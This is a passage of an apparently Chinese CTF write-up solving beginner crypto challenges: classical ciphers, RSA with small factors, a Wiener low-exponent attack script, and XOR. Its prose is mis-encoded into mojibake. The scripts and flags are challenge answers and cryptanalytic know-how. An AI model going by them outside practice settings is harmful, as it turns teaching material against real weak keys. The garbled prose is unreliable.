class="line">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++.&gt;----.&lt;-----.&gt;-----.&gt;-----.&lt;&lt;&lt;-.&gt;&gt;++..&lt;.&gt;.++++++.....------.&lt;.&gt;.&lt;&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;+++++++.&gt;&gt;&gt;+.&lt;&lt;&lt;-------.&gt;&gt;&gt;-.&lt;&lt;&lt;+.+++++++.--..&gt;&gt;&gt;&gt;---.-.&lt;&lt;&lt;&lt;-.+++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-------.+.&gt;&gt;&gt;&gt;&gt;++.</span><br></pre></td></tr></table></figure><p><a href="https://ctf.bugku.com/tool/brainfuck">Brainfuck&#x2F;OoKåŠ å¯†è§£å¯† - Bugku CTF</a>ï¼Œè§£å¯†ä¸€ä¸‹ï¼Œå¾—åˆ°flagï¼š<code>flag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125;</code></p><h3 id="Caesarâ€™s-Secert"><a href="#Caesarâ€™s-Secert" class="headerlink" title="Caesarâ€™s Secert"></a>Caesarâ€™s Secert</h3><p>æ‰“å¼€é™„ä»¶ï¼Œå¾—åˆ°<code>kqfl&#123;hf3x4w&#39;x_h1umjw_n5_a4wd_3fed&#125;</code></p><p>å‡¯æ’’æšä¸¾<a href="https://ctf.bugku.com/tool/caesar">å‡¯æ’’(Caesar)åŠ å¯†&#x2F;è§£å¯† - Bugku CTF</a>ï¼Œå¾—åˆ°flagï¼š<code>flag&#123;ca3s4r&#39;s_c1pher_i5_v4ry_3azy&#125;</code></p><h3 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h3><p>é™„ä»¶å†…å®¹ï¼š<code>fa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3</code></p><p>æ …æ åŠ å¯†<a href="https://ctf.bugku.com/tool/railfence">æ …æ åŠ å¯†&#x2F;è§£å¯† - Bugku CTF</a>ï¼Œæšä¸¾è§£å¯†ï¼Œå¾—åˆ°flagï¼š<code>flag&#123;reordering_the_plaintext#686f8c03&#125;</code></p><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="VigenÃ¨re"></a>VigenÃ¨re</h3><p>é™„ä»¶ï¼š<code>pqcq&#123;qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0&#125;</code></p><p>ç»´å‰å°¼äºšè§£å¯†<a href="https://ctf.bugku.com/tool/vigenere">ç»´å‰å°¼äºšåŠ å¯†&#x2F;è§£å¯† - Bugku CTF</a>ï¼Œå¯†é’¥ç”¨flagå‰4ä¸ªå­—æ¯å°è¯•ä¸€ä¸‹å¾—åˆ°ï¼šKFC</p><p>å¾—åˆ°flagï¼š<code>flag&#123;la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0&#125;</code></p><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>æ‰“å¼€é™„ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">n</span>):</span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        res *= getPrime(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = gen_prime(<span class="number">32</span>)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line"><span class="comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¤§æ•´æ•°åˆ†è§£ç½‘ç«™<a href="http://www.factordb.com/index.php?id=1100000004708746782">factordb.com</a>ï¼Œå°†å…¶åˆ†è§£ä¸ºå¤šä¸ªè´¨æ•°ä¹‹ç§¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1729006607...61&lt;143&gt; = 2217990919&lt;10&gt; Â· 2338725373&lt;10&gt; Â· 2370292207&lt;10&gt; Â· 2463878387&lt;10&gt; Â· 2706073949&lt;10&gt; Â· 2794985117&lt;10&gt; Â· 2804303069&lt;10&gt; Â· 2923072267&lt;10&gt; Â· 2970591037&lt;10&gt; Â· 3207148519&lt;10&gt; Â· 3654864131&lt;10&gt; Â· 3831680819&lt;10&gt; Â· 3939901243&lt;10&gt; Â· 4093178561&lt;10&gt; Â· 4278428893&lt;10&gt;</span><br></pre></td></tr></table></figure><p>è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line">n = <span class="number">2217990919</span> * <span class="number">2338725373</span> * <span class="number">2370292207</span> * <span class="number">2463878387</span> * <span class="number">2706073949</span> * <span class="number">2794985117</span> * <span class="number">2804303069</span> * <span class="number">2923072267</span> * <span class="number">2970591037</span> * <span class="number">3207148519</span> * <span class="number">3654864131</span> * <span class="number">3831680819</span> * <span class="number">3939901243</span> * <span class="number">4093178561</span> * <span class="number">4278428893</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°è¯•åˆ†è§£ n</span></span><br><span class="line">factors = [<span class="number">2217990919</span>, <span class="number">2338725373</span>, <span class="number">2370292207</span>, <span class="number">2463878387</span>, <span class="number">2706073949</span>, <span class="number">2794985117</span>, <span class="number">2804303069</span>, <span class="number">2923072267</span>, <span class="number">2970591037</span>, <span class="number">3207148519</span>, <span class="number">3654864131</span>, <span class="number">3831680819</span>, <span class="number">3939901243</span>, <span class="number">4093178561</span>, <span class="number">4278428893</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®— phi(n)</span></span><br><span class="line">phi_n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> factor <span class="keyword">in</span> factors:</span><br><span class="line">    phi_n *= (factor - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—ç§é’¥ d</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†å¯†æ–‡å¾—åˆ°æ˜æ–‡</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æ˜æ–‡è½¬æ¢ä¸ºå­—èŠ‚å½¢å¼</span></span><br><span class="line">flag = m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h3><p>æ‰“å¼€é™„ä»¶pyä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">d = getPrime(<span class="number">32</span>)</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line"><span class="comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line"><span class="comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°dæ•°å€¼æ¯”è¾ƒå°ï¼Œä½¿ç”¨ä½è§£å¯†æŒ‡æ•°æ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Converts a rational x/y fraction into</span></span><br><span class="line"><span class="string">    a list of partial quotients [a0, ..., an]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    a = x//y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x,y = y,x-a*y</span><br><span class="line">        a = x//y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    computes the list of convergents</span></span><br><span class="line"><span class="string">    using the list of partial quotients</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)):</span><br><span class="line">        convs.append(contfrac_to_rational(frac[<span class="number">0</span>:i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span> (frac):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an]</span></span><br><span class="line"><span class="string">     to an x/y rational.</span></span><br><span class="line"><span class="string">     &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>,-<span class="built_in">len</span>(frac)-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        num, denom = frac[_]*num+denom, num</span><br><span class="line">    <span class="keyword">return</span> (num,denom)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Extended Euclidean Algorithm</span></span><br><span class="line"><span class="string">    returns x, y, gcd(a,b) such that ax + by = gcd(a,b)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    u, u1 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    v, v1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        q = a // b</span><br><span class="line">        u, u1 = u1, u - q * u1</span><br><span class="line">        v, v1 = v1, v - q * v1</span><br><span class="line">        a, b = b, a - q * b</span><br><span class="line">    <span class="keyword">return</span> u, v, a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    2.8 times faster than egcd(a,b)[2]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    a,b=(b,a) <span class="keyword">if</span> a&lt;b <span class="keyword">else</span> (a,b)</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a,b=b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modInverse</span>(<span class="params">e,n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    d such that de = 1 (mod n)</span></span><br><span class="line"><span class="string">    e must be coprime to n</span></span><br><span class="line"><span class="string">    this is assumed to be true</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> egcd(e,n)[<span class="number">0</span>]%n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">totient</span>(<span class="params">p,q</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the totient of pq</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bitlength</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the bitlength of x</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> x &gt;= <span class="number">0</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">        x = x&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the integer square root</span></span><br><span class="line"><span class="string">    for arbitrary large nonnegative integers</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;square root not defined for negative numbers&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    a, b = <span class="built_in">divmod</span>(bitlength(n), <span class="number">2</span>)</span><br><span class="line">    x = <span class="number">2</span>**(a+b)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        y = (x + n//x)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> y &gt;= x:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        x = y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_perfect_square</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    If n is a perfect square it returns sqrt(n),</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    otherwise returns -1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    h = n &amp; <span class="number">0xF</span>; <span class="comment">#last hexadecimal &quot;digit&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> h &gt; <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span> <span class="comment"># return immediately in 6 cases out of 16.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take advantage of Boolean short-circuit evaluation</span></span><br><span class="line">    <span class="keyword">if</span> ( h != <span class="number">2</span> <span class="keyword">and</span> h != <span class="number">3</span> <span class="keyword">and</span> h != <span class="number">5</span> <span class="keyword">and</span> h != <span class="number">6</span> <span class="keyword">and</span> h != <span class="number">7</span> <span class="keyword">and</span> h != <span class="number">8</span> ):</span><br><span class="line">        <span class="comment"># take square root if you must</span></span><br><span class="line">        t = isqrt(n)</span><br><span class="line">        <span class="keyword">if</span> t*t == n:</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wiener_hack</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != -<span class="number">1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    n = <span class="number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line">    e = <span class="number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line">    c = <span class="number">6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line">    d = wiener_hack(e, n)</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="built_in">print</span> (long_to_bytes(m))</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flagï¼š<code>flag&#123;learn_some_continued_fraction_technique#dc16885c&#125;</code></p><h3 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h3><p>æ‰“å¼€é™„ä»¶ï¼Œå¾—åˆ°ä¸€æ®µpythonï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append(f ^ key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></span><br></pre></td></tr></table></figure><p>ç”±äºå·²çŸ¥flagæ˜¯<code>flag&#123;</code>å¼€å¤´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°keyçš„å€¼ï¼Œç¼–å†™è§£å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ciphertext_hex = <span class="string">&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†16è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚åˆ—è¡¨</span></span><br><span class="line">ciphertext_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†å¯†æ–‡</span></span><br><span class="line">plaintext = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ciphertext_bytes:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">chr</span>(c))^<span class="number">143</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#plaintext.append(c ^ key)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†å­—èŠ‚åˆ—è¡¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">plaintext_str = <span 